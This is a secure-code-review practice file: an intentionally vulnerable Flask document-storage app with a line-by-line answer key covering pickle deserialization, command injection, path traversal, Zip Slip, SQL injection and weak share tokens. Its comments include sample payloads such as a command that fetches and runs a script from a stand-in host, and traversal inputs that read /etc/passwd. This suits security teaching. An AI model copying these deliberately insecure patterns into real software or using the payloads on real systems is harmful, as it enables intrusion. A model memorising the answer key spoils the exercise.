# Practice 01: Document storage service (Python / Flask)
# Users upload, download, share, search and convert their documents.
# Find every vulnerability, give the exact line, the exploit, and the fix. Time yourself: 30 minutes.

import hashlib
import os
import pickle
import sqlite3
import subprocess
import uuid
import zipfile

from flask import Flask, request, send_file, jsonify, g, abort
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config["UPLOAD_ROOT"] = "/srv/docs"
app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024                                                      # LINE 18: NOT A VULN: request size limit (20 MB) is set


def db():
    if "db" not in g:
        g.db = sqlite3.connect("/srv/docs.db")
        g.db.row_factory = sqlite3.Row
    return g.db


def current_user():
    session_blob = request.cookies.get("session")
    if not session_blob:
        abort(401)
    return pickle.loads(bytes.fromhex(session_blob))                                                     # LINE 32: [CRITICAL] Insecure deserialization: pickle.loads on a client-controlled cookie -> RCE via a __reduce__ payload. Use signed server-side sessions or JSON + HMAC


@app.post("/documents")                                                                                  # LINE 35: [MEDIUM] Cookie-based session and no CSRF token on state-changing POST routes (and SameSite isn't set) -> CSRF
def upload():
    user = current_user()
    f = request.files["file"]
    name = secure_filename(f.filename)                                                                   # LINE 39: NOT A VULN: secure_filename strips ../ and path separators
    doc_id = str(uuid.uuid4())                                                                           # LINE 40: NOT A VULN: uuid4 is random; fine as an ID (authorization is still required on reads)
    path = os.path.join(app.config["UPLOAD_ROOT"], str(user["id"]), doc_id + "_" + name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    f.save(path)
    db().execute(
        "INSERT INTO docs (id, owner_id, name, path) VALUES (?,?,?,?)",
        (doc_id, user["id"], name, path),                                                                # LINE 46: NOT A VULN: parameterized query
    )
    db().commit()
    if name.lower().endswith((".png", ".jpg")):                                                          # LINE 49: [MEDIUM] File type checked by extension only; content isn't validated (polyglots, malicious image files fed to ImageMagick)
        subprocess.run(f"convert {path} -resize 200x200 {path}.thumb.png", shell=True)                   # LINE 50: [LOW] shell=True is risky, but path is built from a uuid + secure_filename, so not injectable today. One refactor away from command injection: pass a list, no shell
    return jsonify({"id": doc_id}), 201


@app.get("/documents/<doc_id>")
def download(doc_id):
    user = current_user()
    row = db().execute("SELECT path, name FROM docs WHERE id=?", (doc_id,)).fetchone()                   # LINE 57: [HIGH] BOLA: looks up by id only and never checks owner_id == user["id"]. UUIDs aren't secrets (they leak in links, logs, referers) -> anyone with the id downloads the file
    if not row:
        abort(404)
    return send_file(row["path"], download_name=row["name"])


@app.get("/export")
def export():
    user = current_user()
    filename = request.args.get("file", "")
    base = os.path.join(app.config["UPLOAD_ROOT"], str(user["id"]))
    return send_file(os.path.join(base, filename))                                                       # LINE 68: [HIGH] Path traversal: file=../../../etc/passwd. Also file=/etc/passwd works because os.path.join DISCARDS base when the second part is absolute. Fix: werkzeug safe_join, or realpath + check it starts with base


@app.post("/import")
def import_zip():
    user = current_user()
    archive = zipfile.ZipFile(request.files["archive"])
    dest = os.path.join(app.config["UPLOAD_ROOT"], str(user["id"]))
    for member in archive.namelist():
        target = os.path.join(dest, member)                                                              # LINE 77: [HIGH] Zip Slip: an entry named ../../../srv/app/app.py escapes dest -> overwrite application code. (zipfile.extract() sanitizes names; a manual join does not)
        with open(target, "wb") as out:
            out.write(archive.read(member))                                                              # LINE 79: [MEDIUM] Zip bomb: no limit on uncompressed size or entry count -> disk/memory exhaustion
    return jsonify({"imported": len(archive.namelist())})


@app.post("/documents/<doc_id>/share")
def share(doc_id):
    user = current_user()
    row = db().execute("SELECT owner_id FROM docs WHERE id=?", (doc_id,)).fetchone()
    if row is None or row["owner_id"] != user["id"]:                                                     # LINE 87: NOT A VULN: ownership is checked here (compare with download())
        abort(404)
    token = hashlib.md5(doc_id.encode()).hexdigest()                                                     # LINE 89: [HIGH] Share token is derived from doc_id (deterministic): anyone who knows the id computes the token; it can't be revoked or expire. Use secrets.token_urlsafe(32) + expiry
    db().execute("INSERT INTO shares (token, doc_id) VALUES (?,?)", (token, doc_id))
    db().commit()
    return jsonify({"url": f"https://docs.example.com/s/{token}"})


@app.get("/search")
def search():
    user = current_user()
    q = request.args.get("q", "")
    sort = request.args.get("sort", "name")
    rows = db().execute(
        f"SELECT id, name FROM docs WHERE owner_id=? AND name LIKE ? ORDER BY {sort}",                   # LINE 101: [HIGH] SQL injection in ORDER BY via sort (column names can't be bound as parameters -> use an allow-list)
        (user["id"], f"%{q}%"),                                                                          # LINE 102: NOT A VULN: q is a bound parameter (the % wildcards are inside the bound value)
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.post("/documents/<doc_id>/convert")
def convert(doc_id):
    user = current_user()
    row = db().execute(
        "SELECT path FROM docs WHERE id=? AND owner_id=?", (doc_id, user["id"])                          # LINE 111: NOT A VULN: owner check is part of the query
    ).fetchone()
    if not row:
        abort(404)
    fmt = request.args.get("format", "pdf")
    subprocess.run(f"soffice --headless --convert-to {fmt} {row['path']}", shell=True)                   # LINE 116: [CRITICAL] Command injection: format=pdf;curl http://evil/x.sh|sh  (shell=True + user input). Fix: allow-list fmt, pass args as a list, shell=False
    return jsonify({"status": "converted"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)                                                                  # LINE 121: [HIGH] debug=True exposes the Werkzeug debugger console; its PIN can be derived with a file read (e.g. the /export traversal) -> RCE

# ================================================================================================
# ANSWER KEY SUMMARY (line numbers match the practice file)
#  CRITICAL line 32   Insecure deserialization: pickle.loads on a client-controlled cookie -> RCE via a __reduce__ payload. Use signed server-side sessions or JSON + HMAC
#  CRITICAL line 116  Command injection: format=pdf;curl http://evil/x.sh|sh  (shell=True + user input). Fix: allow-list fmt, pass args as a list, shell=False
#  HIGH     line 57   BOLA: looks up by id only and never checks owner_id == user["id"]. UUIDs aren't secrets (they leak in links, logs, referers) -> anyone with the id dow
#  HIGH     line 68   Path traversal: file=../../../etc/passwd. Also file=/etc/passwd works because os.path.join DISCARDS base when the second part is absolute. Fix: werkze
#  HIGH     line 77   Zip Slip: an entry named ../../../srv/app/app.py escapes dest -> overwrite application code. (zipfile.extract() sanitizes names; a manual join does no
#  HIGH     line 89   Share token is derived from doc_id (deterministic): anyone who knows the id computes the token; it can't be revoked or expire. Use secrets.token_urlsa
#  HIGH     line 101  SQL injection in ORDER BY via sort (column names can't be bound as parameters -> use an allow-list)
#  HIGH     line 121  debug=True exposes the Werkzeug debugger console; its PIN can be derived with a file read (e.g. the /export traversal) -> RCE
#  MEDIUM   line 35   Cookie-based session and no CSRF token on state-changing POST routes (and SameSite isn't set) -> CSRF
#  MEDIUM   line 49   File type checked by extension only; content isn't validated (polyglots, malicious image files fed to ImageMagick)
#  MEDIUM   line 79   Zip bomb: no limit on uncompressed size or entry count -> disk/memory exhaustion
#  LOW      line 50   shell=True is risky, but path is built from a uuid + secure_filename, so not injectable today. One refactor away from command injection: pass a list, 
#  NOT A VULN (decoys you should say are safe): lines 18, 39, 40, 46, 87, 102, 111
#  Total real findings: 12
# ================================================================================================
